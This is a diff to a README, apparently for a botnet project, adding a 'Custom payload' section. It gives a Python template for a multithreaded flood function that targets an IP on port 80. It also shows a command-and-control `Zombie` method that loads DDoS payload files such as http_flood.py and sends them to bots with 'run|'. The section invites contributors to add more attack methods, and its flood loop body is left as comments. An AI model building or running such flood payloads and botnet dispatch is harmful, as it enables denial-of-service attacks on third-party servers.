@@ -57,6 +57,46 @@ chmod +x ./script/*.sh
 
 <br>
 
+> # Custom payload.
+
+***If you whant to share your methods, just create pull requests <3***
+
+1. Create your method with the template (*#1*)
+2. You need to add your method in class `Zombie` (**cnc.py** / *#2*)
+
+
+- #1:
+```py
+import socket, threading, time
+
+def method_name(ip: str, timeout: str, thread: str):
+    def flood(ip: str, port: int, timeout: int):
+        start_time = int(time.time())
+
+        while int(time.time()) - start_time < timeout:
+            # write method code here
+            # Exemple: https://github.com/Its-Vichy/HBot/blob/main/src/payload/http_flood.py
+
+    for _ in range(int(thread)):
+        threading.Thread(target= flood, args=(ip, 80, int(timeout))).start()
+
+method_name('!ip!', '!port!', '!time!')
+```
+
+- #2:
+```py
+def ddos_payload(self, ip: str, port: str, timeout: str, type: str):
+    if type == 'http':
+        payload = self.parse_method('./payload/http_flood.py', ip, port, timeout)
+    
+    if type == 'your method name without space lmao':
+        payload = self.parse_method('./payload/your_method_file.py', ip, port, timeout)
+        
+    self.send(f'run|{payload}')
+```
+ 
+<br>
+
 > # How is working.
 
 * **Loader**: soon..
